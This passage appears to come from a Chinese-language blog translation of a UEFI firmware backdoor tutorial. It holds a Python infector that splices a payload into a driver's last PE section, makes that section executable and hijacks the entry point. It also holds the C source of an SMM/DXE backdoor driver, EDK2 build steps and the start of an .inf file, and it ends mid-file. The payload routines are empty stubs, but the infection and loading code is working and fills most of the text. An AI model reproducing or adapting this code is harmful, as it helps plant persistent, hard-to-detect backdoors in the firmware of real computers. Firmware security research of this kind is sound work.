<span class="keyword">raise</span> Exception(<span class="string">&#x27;Unable to find %s section&#x27;</span> % INFECTOR_CONFIG_SECTION)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_infector_config_get</span>(<span class="params">pe, data</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        offs = _infector_config_offset(pe)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> unpack(INFECTOR_CONFIG_FMT, data[offs : offs + INFECTOR_CONFIG_LEN])        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_infector_config_set</span>(<span class="params">pe, data, *args</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        offs = _infector_config_offset(pe)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> data[: offs] + \</span><br><span class="line">               pack(INFECTOR_CONFIG_FMT, *args) + \</span><br><span class="line">               data[offs + INFECTOR_CONFIG_LEN :]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 加载目标 image</span></span><br><span class="line">    pe_src = pefile.PE(src)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 加载payload image</span></span><br><span class="line">    pe_payload = pefile.PE(payload)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> pe_src.DOS_HEADER.e_res == INFECTOR_SIGN:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;%s is already infected&#x27;</span> % src)        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> pe_src.FILE_HEADER.Machine != pe_payload.FILE_HEADER.Machine:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Architecture missmatch&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将payload image数据读入字符串</span></span><br><span class="line">    data = <span class="built_in">open</span>(payload, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 读取_INFECTOR_CONFIG，这个结构体位于payload image的.conf节</span></span><br><span class="line">    conf_ep_new, conf_ep_old = _infector_config_get(pe_payload, data)    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    last_section = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> section <span class="keyword">in</span> pe_src.sections:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 找到目标 image的最后一个节</span></span><br><span class="line">        last_section = section</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> last_section.Misc_VirtualSize &gt; last_section.SizeOfRawData:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Last section virtual size must be less or equal than raw size&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 保存目标 image的原始入口地址</span></span><br><span class="line">    conf_ep_old = pe_src.OPTIONAL_HEADER.AddressOfEntryPoint</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将更新后的_INFECTOR_CONFIG写入payload image</span></span><br><span class="line">    data = _infector_config_set(pe_payload, data, conf_ep_new, conf_ep_old)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置目标 image的新入口点</span></span><br><span class="line">    pe_src.OPTIONAL_HEADER.AddressOfEntryPoint = \</span><br><span class="line">        last_section.VirtualAddress + last_section.SizeOfRawData + conf_ep_new</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 更新最后一个节的大小</span></span><br><span class="line">    last_section.SizeOfRawData += <span class="built_in">len</span>(data)</span><br><span class="line">    last_section.Misc_VirtualSize = last_section.SizeOfRawData</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使其可执行</span></span><br><span class="line">    last_section.Characteristics = pefile.SECTION_CHARACTERISTICS[<span class="string">&#x27;IMAGE_SCN_MEM_READ&#x27;</span>] | \</span><br><span class="line">                                   pefile.SECTION_CHARACTERISTICS[<span class="string">&#x27;IMAGE_SCN_MEM_WRITE&#x27;</span>] | \</span><br><span class="line">                                   pefile.SECTION_CHARACTERISTICS[<span class="string">&#x27;IMAGE_SCN_MEM_EXECUTE&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 更新 image文件头</span></span><br><span class="line">    pe_src.DOS_HEADER.e_res = INFECTOR_SIGN</span><br><span class="line">    pe_src.OPTIONAL_HEADER.SizeOfImage = \</span><br><span class="line">        last_section.VirtualAddress + last_section.Misc_VirtualSize</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取受感染的 image数据</span></span><br><span class="line">    data = pe_src.write() + data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> dst <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(dst, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> fd:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment"># save infected image to the file</span></span><br><span class="line">            fd.write(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure>


<p>如前所述，感染器payload只是DXE&#x2F;SMM组合驱动程序的常规PE image。加载后，该 image更新它的重定位基址，执行后门初始化操作，并将执行转移到被感染 image的原始入口点（它的RVA地址被感染器保存在payload image的.conf部分）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// file: SmmBackdoor.c</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// UEFI SMM foundation headers</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;FrameworkSmm.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// required EDK protocols</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Protocol/LoadedImage.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Protocol/SmmCpu.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Protocol/SmmBase2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Protocol/SmmAccess2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Protocol/SmmSwDispatch2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Protocol/SmmPeriodicTimerDispatch2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Protocol/DevicePath.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Protocol/SerialIo.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// required EDK libraries</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Library/UefiDriverEntryPoint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Library/UefiBootServicesTableLib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Library/DebugLib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Library/DevicePathLib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Library/UefiRuntimeLib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Library/SynchronizationLib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// PE image structures</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;IndustryStandard/PeImage.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;config.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;common.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;printf.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;debug.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;loader.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;SmmBackdoor.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;asm/common_asm.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 该函数为被感染 image的入口点</span></span><br><span class="line">EFI_STATUS</span><br><span class="line"><span class="title function_">BackdoorEntryInfected</span><span class="params">(</span></span><br><span class="line"><span class="params">    EFI_HANDLE ImageHandle,</span></span><br><span class="line"><span class="params">    EFI_SYSTEM_TABLE *SystemTable</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> section(<span class="string">&quot;.conf&quot;</span>, read, write)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 为感染器提供PE image节的信息</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;.conf&quot;</span>)) INFECTOR_CONFIG m_InfectorConfig = </span><br><span class="line">&#123; </span><br><span class="line">    <span class="comment">// 被感染文件的新入口点地址</span></span><br><span class="line">    (PVOID)&amp;BackdoorEntryInfected,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 旧入口点地址 (将被感染器设置)</span></span><br><span class="line">    <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// DXE and runtime 阶段的API</span></span><br><span class="line">EFI_SYSTEM_TABLE *gST;</span><br><span class="line">EFI_BOOT_SERVICES *gBS;</span><br><span class="line">EFI_RUNTIME_SERVICES *gRT;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// SMM 阶段的API</span></span><br><span class="line">EFI_SMM_SYSTEM_TABLE2 *gSmst = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOLEAN m_bInfectedImage = FALSE;</span><br><span class="line">EFI_HANDLE m_ImageHandle = <span class="literal">NULL</span>;</span><br><span class="line">PVOID m_ImageBase = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">//--------------------------------------------------------------------------------------</span></span><br><span class="line">PVOID <span class="title function_">BackdoorImageAddress</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    PVOID Addr = _get_addr();</span><br><span class="line">    UINT64 Base = ALIGN_DOWN((UINT64)Addr, DEFAULT_EDK_ALIGN);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过模块内部地址获取当前模块的基址</span></span><br><span class="line">    <span class="keyword">while</span> (*(PUSHORT)Base != EFI_IMAGE_DOS_SIGNATURE)</span><br><span class="line">    &#123;</span><br><span class="line">        Base -= DEFAULT_EDK_ALIGN;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Base;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//--------------------------------------------------------------------------------------</span></span><br><span class="line">EFI_STATUS <span class="title function_">BackdoorImageCallRealEntry</span><span class="params">(</span></span><br><span class="line"><span class="params">    PVOID Image,</span></span><br><span class="line"><span class="params">    EFI_HANDLE ImageHandle,</span></span><br><span class="line"><span class="params">    EFI_SYSTEM_TABLE *SystemTable)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (m_InfectorConfig.OriginalEntryPoint != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        EFI_IMAGE_ENTRY_POINT pEntry = (EFI_IMAGE_ENTRY_POINT)RVATOVA(</span><br><span class="line">            Image, </span><br><span class="line">            m_InfectorConfig.OriginalEntryPoint</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用原始入口点</span></span><br><span class="line">        <span class="keyword">return</span> pEntry(ImageHandle, SystemTable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EFI_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//--------------------------------------------------------------------------------------</span></span><br><span class="line">VOID <span class="title function_">BackdoorEntryDxe</span><span class="params">(VOID)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// DXE 阶段 payload 代码</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//--------------------------------------------------------------------------------------</span></span><br><span class="line">VOID <span class="title function_">BackdoorEntrySmm</span><span class="params">(VOID)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// SMM 阶段 payload 代码</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//--------------------------------------------------------------------------------------</span></span><br><span class="line">EFI_STATUS</span><br><span class="line"><span class="title function_">BackdoorEntryInfected</span><span class="params">(</span></span><br><span class="line"><span class="params">    EFI_HANDLE ImageHandle,</span></span><br><span class="line"><span class="params">    EFI_SYSTEM_TABLE *SystemTable)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 获取payload image地址</span></span><br><span class="line">    PVOID Base = BackdoorImageAddress();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新payload image的重定位基址</span></span><br><span class="line">    LdrProcessRelocs(Base, Base);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用LdrProcessRelocs()之后，就可以使用全局变量和数据了</span></span><br><span class="line">    m_ImageBase = Base;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用payload image的原始入口点</span></span><br><span class="line">    <span class="keyword">return</span> BackdoorEntry(</span><br><span class="line">        ImageHandle,</span><br><span class="line">        SystemTable</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//--------------------------------------------------------------------------------------</span></span><br><span class="line">EFI_STATUS </span><br><span class="line"><span class="title function_">BackdoorEntry</span><span class="params">(</span></span><br><span class="line"><span class="params">    IN EFI_HANDLE ImageHandle,</span></span><br><span class="line"><span class="params">    IN EFI_SYSTEM_TABLE *SystemTable)</span> </span><br><span class="line">&#123;</span><br><span class="line">    EFI_STATUS Ret = EFI_SUCCESS, Status = EFI_SUCCESS;</span><br><span class="line">    BOOLEAN bInSmram = FALSE;</span><br><span class="line">    PVOID Image = <span class="literal">NULL</span>;            </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    EFI_LOADED_IMAGE *LoadedImage = <span class="literal">NULL</span>;   </span><br><span class="line">    EFI_SMM_BASE2_PROTOCOL *SmmBase = <span class="literal">NULL</span>;    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (m_ImageHandle == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        m_ImageHandle = ImageHandle;    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        gST = SystemTable;</span><br><span class="line">        gBS = gST-&gt;BootServices;</span><br><span class="line">        gRT = gST-&gt;RuntimeServices;           </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        DbgMsg(__FILE__, __LINE__, <span class="string">&quot;BackdoorEntry() called\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取当前 image的信息</span></span><br><span class="line">        gBS-&gt;HandleProtocol(ImageHandle, &amp;gEfiLoadedImageProtocolGuid, (VOID *)&amp;LoadedImage);    </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (m_ImageBase == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// payload image作为独立的EFI应用程序或驱动程序加载</span></span><br><span class="line">            m_bInfectedImage = FALSE;</span><br><span class="line">            m_ImageBase = LoadedImage-&gt;ImageBase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            DbgMsg(__FILE__, __LINE__, <span class="string">&quot;Started as standalone driver/app\r\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// payload image被加载为感染者payload</span></span><br><span class="line">            m_bInfectedImage = TRUE;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            DbgMsg(__FILE__, __LINE__, <span class="string">&quot;Started as infector payload\r\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        DbgMsg(__FILE__, __LINE__, <span class="string">&quot;Image base address is &quot;</span>FPTR<span class="string">&quot;\r\n&quot;</span>, m_ImageBase);    </span><br><span class="line">    &#125;     </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Status = gBS-&gt;LocateProtocol(&amp;gEfiSmmBase2ProtocolGuid, <span class="literal">NULL</span>, (PVOID *)&amp;SmmBase);</span><br><span class="line">    <span class="keyword">if</span> (Status == EFI_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 检测被感染的驱动程序是否正在SMM中运行</span></span><br><span class="line">        SmmBase-&gt;InSmm(SmmBase, &amp;bInSmram);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (bInSmram)</span><br><span class="line">        &#123;</span><br><span class="line">            DbgMsg(__FILE__, __LINE__, <span class="string">&quot;Running in SMM\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            Status = SmmBase-&gt;GetSmstLocation(SmmBase, &amp;gSmst);</span><br><span class="line">            <span class="keyword">if</span> (Status == EFI_SUCCESS)</span><br><span class="line">            &#123;</span><br><span class="line">                DbgMsg(__FILE__, __LINE__, <span class="string">&quot;SMM system table is at &quot;</span>FPTR<span class="string">&quot;\r\n&quot;</span>, gSmst);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="comment">// 运行SMM特定代码</span></span><br><span class="line">                BackdoorEntrySmm();</span><br><span class="line">            &#125;   </span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                DbgMsg(__FILE__, __LINE__, <span class="string">&quot;GetSmstLocation() fails: 0x%X\r\n&quot;</span>, Status);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;                </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!bInSmram)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 运行DXE特定代码</span></span><br><span class="line">        BackdoorEntryDxe();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (m_bInfectedImage)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 调用被感染 image的原始入口点</span></span><br><span class="line">        Ret = BackdoorImageCallRealEntry(LoadedImage-&gt;ImageBase, ImageHandle, SystemTable);</span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//--------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// EoF</span></span><br></pre></td></tr></table></figure>


<p>为了编译UEFI驱动，我使用之前提到的EDK2。不幸的是，在我的OS X机器上，编译错误导致编译失败，所以，我将在Windows机器上安装Visual Studio 2008编译SMM后门驱动程序。<br>首先，我们需要从<a target="_blank" rel="noopener" href="https://github.com/tianocore/edk2%E4%B8%AD%E5%85%8B%E9%9A%86EDK2%E6%BA%90%E4%BB%A3%E7%A0%81%E6%A0%91%EF%BC%8C%E5%B9%B6%E9%98%85%E8%AF%BBBuildNotes2.txt%E6%96%87%E6%A1%A3%E4%B8%AD%E7%9A%84%E7%BC%96%E8%AF%91%E6%8C%87%E4%BB%A4%E3%80%82%E7%84%B6%E5%90%8E%E6%88%91%E4%BB%AC%E9%9C%80%E8%A6%81%E7%BC%96%E8%BE%91%60Conf/target.txt%60%E6%96%87%E4%BB%B6%EF%BC%8C%E5%B9%B6%E8%AE%BE%E7%BD%AE%60ACTIVE_PLATFORM%60%E5%B1%9E%E6%80%A7%E5%80%BC%E4%B8%BA%60OvmfPkg/OvmfPkgX64%60%E3%80%82%E5%B0%86%E5%B8%A6%E6%9C%89%E5%90%8E%E9%97%A8%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F%E6%BA%90%E4%BB%A3%E7%A0%81%E7%9A%84%E7%9B%AE%E5%BD%95([SmmBackdoor](https://github.com/Cr4sh/SmmBackdoor))%E5%A4%8D%E5%88%B6%E5%88%B0%E5%B8%A6%E6%9C%89EDK2%E6%BA%90%E4%BB%A3%E7%A0%81%E7%9A%84%E7%9B%AE%E5%BD%95%E4%B8%AD%E3%80%82">https://github.com/tianocore/edk2中克隆EDK2源代码树，并阅读BuildNotes2.txt文档中的编译指令。然后我们需要编辑`Conf/target.txt`文件，并设置`ACTIVE_PLATFORM`属性值为`OvmfPkg/OvmfPkgX64`。将带有后门驱动程序源代码的目录([SmmBackdoor](https://github.com/Cr4sh/SmmBackdoor))复制到带有EDK2源代码的目录中。</a><br>EDK2使用自己的makefile格式，对于我们的项目，我们需要自己编写<code>SmmBackdoor/SmmBackdoor.inf</code>文件，内容如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"># main settings</span><br><span class="line">[defines]</span><br><span class="line">  INF_VERSION = 0x00010005 </span><br><span class="line">  BASE_NAME = SmmBackdoor</span><br><span class="line">  FILE_GUID = 22D5AE41-147E-4C44-AE72-ECD9BBB455C1 # random one</span><br><span class="line">  MODULE_TYPE = DXE_SMM_DRIVER</span><br><span class="line">  ENTRY_POINT = BackdoorEntry</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># C sources</span><br><span class="line">[Sources]</span><br><span class="line">  debug.c</span><br><span class="line">  loader.c</span><br><span class="line">  printf.c</span><br><span class="line">  serial.c</span><br><span class="line">  SmmBackdoor.c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># architecture-specific assembly sources</span><br><span class="line">[Sources.X64]</span><br><span class="line">  asm/amd64/common_asm.asm</span><br><span class="line"></span><br><span 